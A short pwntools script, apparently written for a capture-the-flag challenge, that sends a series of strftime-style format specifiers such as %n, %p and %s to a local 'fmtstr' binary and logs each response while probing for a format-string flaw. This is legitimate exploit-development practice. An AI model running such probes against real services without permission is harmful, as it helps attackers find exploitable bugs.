#!/usr/bin/python3

from pwn import *

exe = ELF('fmtstr', checksec=False)

context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
GDB()
day = []
fmt = ['%a', '%A', '%b', '%B', '%c', '%C', '%d', '%D', '%e', '%E', '%F', '%G', '%g', '%h', '%H', '%I', '%j', '%k', '%l', '%m', '%M',
       '%n', '%O', '%p', '%P', '%r', '%R', '%s', '%S', '%t', '%T', '%u', '%U', '%V', '%w', '%W', '%x', '%X', '%Y', '%z', "%Z", "%+", "%%"]
with open("day", 'r') as f:
    day = f.read().splitlines()
print(day)
for d in day:
    sla(b'> ', b'2')
    sla(b': ', d)

    for i in fmt:
        sla(b'> ', b'1')
        sla(b': ', i)
        p.recvuntil(b'Formatted: ')
        with open("res", 'a') as f:
            day = f.write(str(p.recvline()) +f"| {d} {i}" '\n' )

p.interactive()
